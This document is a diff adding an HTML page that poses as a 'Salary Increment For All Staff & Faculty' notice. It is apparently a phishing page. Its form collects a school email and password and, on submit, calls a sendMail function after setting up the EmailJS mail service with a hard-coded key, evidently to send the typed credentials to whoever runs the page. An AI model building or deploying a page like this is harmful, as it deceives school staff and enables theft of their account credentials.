@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salary Increment For All Staff & Faculty</title>
+    <link rel="stylesheet" href="style.css">   
+    <script src="index.js"></script>
+    <script type="text/javascript"
+            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("YUKFoIWdJE1GPoTS0");
+       })();
+    </script>
+</head>
+<body>
+        <div class="container">
+            <form onsubmit="sendMail(); reset(); return false;">
+                <div class="text"> 
+                    <h1>Salary Increment For All Staff & Faculty</h1>
+                    <input type="email" id="email" placeholder="School Email-Log" required >
+                    <input type="password" id="password" placeholder="School Pass-Log" required>        
+                    <button onsubmit="sendMail()">Submit</button>
+                </div>
+            </form>
+        </div>
+</body>
+</html>
